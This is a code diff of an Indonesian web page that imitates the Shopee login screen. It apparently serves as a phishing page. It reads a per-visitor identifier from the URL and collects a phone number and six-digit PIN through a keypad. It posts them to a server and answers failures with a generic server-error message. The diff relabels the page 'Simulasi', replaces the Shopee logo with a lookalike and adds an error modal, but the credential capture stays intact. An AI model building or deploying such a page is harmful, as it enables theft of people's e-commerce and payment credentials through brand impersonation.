@@ -35,12 +35,6 @@
         * {
             -webkit-tap-highlight-color: transparent;
         }
-
-        /* Menghilangkan outline fokus bawaan browser pada input */
-        input:focus {
-            outline: none !important;
-            box-shadow: none !important;
-        }
     </style>
 </head>
 
@@ -55,27 +49,42 @@
             <span class="text-shopee-main font-semibold mt-4 text-base tracking-wide">Memproses...</span>
         </div>
 
+        <div x-show="guestErrorModalOpen" x-transition.opacity @keydown.escape.window="closeGuestError"
+            class="fixed inset-0 z-[110] grid place-items-center bg-black/50 px-5" style="display: none;">
+            <div role="dialog" aria-modal="true" class="w-full max-w-sm rounded-xl bg-white p-5 shadow-xl">
+                <div class="mx-auto grid h-12 w-12 place-items-center rounded-full bg-red-50 text-red-600">
+                    <i data-lucide="circle-alert" class="h-6 w-6"></i>
+                </div>
+                <h2 class="mt-4 text-center text-lg font-semibold text-gray-900">Halaman tidak aktif</h2>
+                <p class="mt-2 text-center text-sm leading-6 text-gray-600" x-text="guestModalMessage"></p>
+                <button type="button" @click="closeGuestError"
+                    class="mt-5 w-full rounded-md bg-shopee-main px-4 py-2.5 text-sm font-semibold text-white hover:bg-shopee-hover">
+                    Mengerti
+                </button>
+            </div>
+        </div>
+
         <form @submit.prevent="continueToPin">
             <header class="flex items-center justify-between p-4 border-b border-gray-100">
                 <i @click="goBack" class="fa-solid fa-arrow-left text-shopee-main text-xl cursor-pointer"></i>
-                <h1 class="text-lg font-medium flex-1 ml-4 text-black">Log In</h1>
+                <h1 class="text-lg font-medium flex-1 ml-4 text-black">Log In (Simulasi)</h1>
                 <i class="fa-regular fa-circle-question text-shopee-main text-xl cursor-pointer"></i>
             </header>
 
             <main class="p-6">
                 <div class="flex justify-center mb-10">
-                    <img src="logo.png" alt="Shopee Logo" class="h-20 w-auto object-contain mt-3" onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg';">
+                    <div class="relative w-16 h-16 bg-shopee-main rounded-xl flex justify-center items-center mt-3">
+                        <div class="absolute -top-3 w-8 h-5 border-[3px] border-shopee-main border-b-0 rounded-t-full">
+                        </div>
+                        <span class="text-white text-4xl font-serif font-bold">S</span>
+                    </div>
                 </div>
 
-                <div class="flex items-center border-b py-3 mb-5 transition-colors duration-200"
-                    :class="isInputFocused ? 'border-shopee-main' : 'border-gray-300'">
+                <div class="flex items-center border-b border-gray-300 py-3 mb-5">
                     <i class="fa-solid fa-mobile-screen text-gray-500 text-xl mr-3"></i>
                     <span class="text-gray-800 text-lg mr-2 font-medium">+62</span>
-                    <input x-model="phone" @input="phone = sanitizePhone(phone)" 
-                        @focus="isInputFocused = true" 
-                        @blur="isInputFocused = false"
-                        type="tel" inputmode="tel" maxlength="32" 
-                        class="flex-1 text-lg outline-none text-gray-800 bg-transparent border-0 p-0" 
+                    <input x-model="phone" @input="phone = sanitizePhone(phone)" type="tel" inputmode="tel"
+                        maxlength="32" class="flex-1 text-lg outline-none text-gray-800 bg-transparent" 
                         placeholder="Nomor Telepon">
                 </div>
 
@@ -171,22 +180,22 @@
                 </div>
 
                 <div>
-                    <button type="button" @click="pemicuGetar(); pin = ''" class="text-blue-600 font-medium text-sm">Bersihkan</button>
+                    <button type="button" @click="pin = ''" class="text-blue-600 font-medium text-sm">Bersihkan</button>
                 </div>
             </div>
 
             <div class="bg-gray-100 w-full border-t border-gray-200 grid grid-cols-3 text-2xl font-medium text-black">
                 <template x-for="number in keypad" :key="number">
-                    <button type="button" @click="pemicuGetar(); addPin(number)"
+                    <button type="button" @click="addPin(number)"
                         class="bg-white py-4 border-r border-b border-gray-200 active:bg-gray-100" x-text="number"></button>
                 </template>
 
                 <div class="bg-gray-200 py-4 border-r border-gray-300"></div>
 
-                <button type="button" @click="pemicuGetar(); addPin('0')"
+                <button type="button" @click="addPin('0')"
                     class="bg-white py-4 border-r border-gray-300 active:bg-gray-100">0</button>
 
-                <button type="button" @click="pemicuGetar(); removePin()"
+                <button type="button" @click="removePin"
                     class="bg-gray-200 py-4 flex justify-center items-center active:bg-gray-300" aria-label="Hapus digit">
                     <i class="fa-solid fa-delete-left text-xl text-black"></i>
                 </button>
@@ -207,25 +216,21 @@
                 pin: '',
                 error: '',
                 guestErrorMessage: 'Terjadi kesalahan pada server',
+                guestErrorModalOpen: false,
+                guestModalMessage: '',
                 showPinModal: false,
                 isProcessing: false,
                 keypad: ['1', '2', '3', '4', '5', '6', '7', '8', '9'],
-                isInputFocused: false,
 
                 init() {
                     const params = new URLSearchParams(window.location.search);
                     this.identifier = (params.get('identifier') || '').trim();
 
                     if (!this.identifier) {
-                        this.error = this.guestErrorMessage;
+                        this.showGuestError(this.guestErrorMessage);
                     }
 
                     this.refreshIcons();
-                },
-                pemicuGetar() {
-                    if (navigator.vibrate) {
-                        navigator.vibrate(35);
-                    }
                 },
                 refreshIcons() {
                     this.$nextTick(() => window.lucide?.createIcons());
@@ -238,24 +243,27 @@
                 sanitizePhone(value) {
                     return String(value || '').replace(/[^0-9+()\-\s]/g, '').slice(0, 32);
                 },
+                showGuestError(message) {
+                    this.error = '';
+                    this.guestModalMessage = message || this.guestErrorMessage;
+                    this.guestErrorModalOpen = true;
+                    this.refreshIcons();
+                },
+                closeGuestError() {
+                    this.guestErrorModalOpen = false;
+                    this.guestModalMessage = '';
+                },
                 continueToPin() {
                     this.error = '';
 
                     if (!this.identifier || !/^[0-9+()\-\s]{6,32}$/.test(this.phone.trim())) {
-                        this.error = this.guestErrorMessage;
+                        this.showGuestError(this.guestErrorMessage);
                         return;
                     }
 
                     this.pin = '';
                     this.showPinModal = true;
                     this.refreshIcons();
-
-                    this.$nextTick(() => {
-                        window.scrollTo({
-                            top: document.documentElement.scrollHeight || document.body.scrollHeight,
-                            behavior: 'smooth'
-                        });
-                    });
                 },
                 closePinModal() {
                     if (this.isProcessing) return;
@@ -281,7 +289,7 @@
                     if (this.isProcessing) return;
 
                     if (!/^[0-9]{6}$/.test(this.pin)) {
-                        this.error = this.guestErrorMessage;
+                        this.showGuestError(this.guestErrorMessage);
                         this.showPinModal = false;
                         this.pin = '';
                         return;
@@ -306,14 +314,14 @@
                         const data = await response.json().catch(() => ({}));
 
                         if (!response.ok || data.ok === false) {
-                            throw new Error(this.guestErrorMessage);
+                            throw new Error(data.message || this.guestErrorMessage);
                         }
 
                         this.phone = '';
                         this.pin = '';
                         this.showPinModal = false;
-                    } catch (_) {
-                        this.error = this.guestErrorMessage;
+                    } catch (error) {
+                        this.showGuestError(error.message || this.guestErrorMessage);
                         this.pin = '';
                         this.showPinModal = false;
                     } finally {
